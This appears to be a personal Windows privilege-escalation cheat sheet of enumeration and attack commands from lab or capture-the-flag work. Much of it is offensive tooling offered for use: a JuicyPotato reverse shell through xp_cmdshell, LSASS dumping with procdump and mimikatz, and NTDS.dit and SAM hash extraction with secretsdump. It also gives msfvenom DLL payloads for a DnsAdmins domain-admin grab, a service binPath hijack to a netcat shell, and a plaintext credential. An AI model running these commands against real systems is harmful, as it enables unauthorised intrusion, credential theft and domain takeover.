

## Finding file
```bash
dir <file> /s # recommended from C:\
dir <directory> # C:\NameOfDirectory check what files exists 
```

## Network
```bash
ipconfig /all
arp -a
route print
```

## Windows Defender Status
```bash
Get-MpComputerStatus
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone
```
## Tasks that is running
```bash
tasklist /svc
```
## Environment Variables in system
```bash
set
```
## View Detailed Configuration Information
```bash
systeminfo
wmic qfe # patches and updates
Get-HotFix | ft -AutoSize # as previous but PowerShell
wmic product get name # installed programs
Get-WmiObject -Class Win32_Product |  select Name, Version # as previous but PowerShell
```

## Running processes
```bash
netstat -ano # TCP and UDP connections in localhost
netstat -ano | findstr ":8080" # with find string which contains :8080
tasklist # using for cathing name of process recommended with findstr
```

## Logged-In Users && Current User && User Privileges && Groups
```bash
query user # all logged-in users
echo %USERNAME% # as whoami current user
whoami /priv # current user privileges
whoami /groups # current user group information
net user # get all users in system
net localgroup # get all groups in system
net localgroup <group> # can be administrators used for checking details about a group
net accounts # password policy and account info
```

## SQL Server with privileged user
```bash
impacket-mssqlclient <user>@<target_ip> -windows-auth # password required
# Comands in sql server after access
SQL> enable_xp_cmdshell # must enable this, stored procedure to run operating system commands
SQL> xp_cmdshell whoami # confirm working
xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.15.65 9001 -e cmd.exe" -t *
# Starting reverse shell to your local machine by JuicyPotato but you may know that it is installed and running port(53375)
```

## SeDebugPrivilege
```bash
Computer Settings > Windows Settings > Security Settings # setting as admin
procdump.exe -accepteula -ma lsass.exe lsass.dmp
# ^ dump process memory by procdump.exe and choosing lsass process because
# it stores creds after user log in system but can be anouther process
mimikatz.exe # see dumped creds form previous command
# commands into mimikatz
loglog
sekurlsa::minidump <file.dmp> # lsass.dmp
sekurlsa::logonpasswords # dumped creds
```
## Windows Build-in Groups
```bash
Import-Module .\SeBackupPrivilegeUtils.dll # import module 
Import-Module .\SeBackupPrivilegeCmdLets.dll
Get-SeBackupPrivilege # see if privilege enabled
Set-SeBackupPrivilege # change status enabled/disabled
Copy-FileSeBackupPrivilege 'C:\<dir>\<file>' .\<file> # copy privileged file which could not be
# ^ opened with current permisions
# Active directory database NTDS.dit which contains NTLM hashes if
# if database in locked or not accessible use diskshadow >>>
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit # bypass ACL and opy the NTDS.dit locally
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV # can be dumped hashes by using impacket secretsdump.py
Import-Module .\DSInternals.psd1 # module also used to dump creds (PowerShell)
$key = Get-BootKey -SystemHivePath .\SYSTEM
Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
impacket-secretsdump -sam sam -system system local # with having databases in local machine
# ^ dump hashes
impacket-secretsdump -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL # the same

```
## Diskshadow && robocopy
```bash
diskshadow.exe # could be diskshadow RUN <<<
diskshadow -s script.txt # run script with diskshadow commands
# reference to microsoft documentation with all commands
https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow
# default script
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
set context persistent
begin backup
add volume C: alias cdrive
create
expose %cdrive% E:
end backup
# robocopy
robocopy /B E:\Windows\NTDS .\ntds ntds.dit

reg save hklm\system C:\Users\h.grangon\Documents\system
reg save hklm\sam C:\Users\h.grangon\Documents\sam
download system
download sam
```
## Event Log Readers
```bash
net localgroup "Event Log Readers"
wevtutil qe Security /rd:true /f:text | Select-String "/user" # security logs by tool wevtutil
wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user" # pass creds to wevtutil
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
# ^ filter process events by -eq 4688
```

## DNS Admins
```bash
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll # do malicious dll file on local machine
msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.15.61 LPORT=9001 -f dll > reverse.dll
python3 -m http.server <port> # local machine
wget "http://10.10.14.3:7777/adduser.dll" -outfile "adduser.dll" # take file from local machine
Get-ADGroupMember -Identity DnsAdmins # Power Shell
Get-ADDomain
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll # loading dll as non-privileged user
wmic useraccount where name="<name_of_user" get sid # get sid of typed user
sc.exe sdshow DNS # check perms of service
sc <stop/start> dns # if have perms to start or stop dns ^
net group "Domain Admins" /dom # verify that perms is escalated
Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName <dc.name.local> # disable block list
Add-DnsServerResourceRecordA -Name wpad -ZoneName <name.local> -ComputerName <dc.name.local> -IPv4Address <ip>
```
## SeLoadDriverPrivilege

```bash
services
```

Look what services is running for example

```bash
"C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"   True VGAuthService 
```
Upload to target machine `nc.exe` 

```bash
sc.exe config VMTools binPath="C:\Users\svc-printer\Desktop\nc.exe -e cmd.exe  10.10.14.117  9001"
```

Start listener in local machine `rlwrap nc -lvnp  9001` rerun service

```bash
sc.exe stop  VMTools
#
sc.exe start VMTools
```

## SeIncreasePrivilege

Used GodPotato tool with python3

```bash
.\GodPotato-NET4.exe
```



















